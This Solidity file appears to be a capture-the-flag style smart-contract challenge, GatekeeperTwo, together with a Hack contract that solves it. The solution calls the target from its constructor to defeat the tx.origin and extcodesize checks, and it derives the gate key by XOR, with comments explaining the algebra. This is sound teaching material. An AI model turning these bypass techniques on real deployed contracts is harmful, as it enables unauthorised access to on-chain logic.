// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }
    // X XOR Key == A(1111111111111111)
    // X XOR X XOR Key == A XOR X
    // 0 XOR Key == A XOR X
    // Key == A XOR X
    // Key == 1111111111111111 XOR X
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    GatekeeperTwo public target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);
        uint64 mask = type(uint64).max;
        bytes8 key = bytes8(
            mask ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );
        target.enter(key);
    }
}
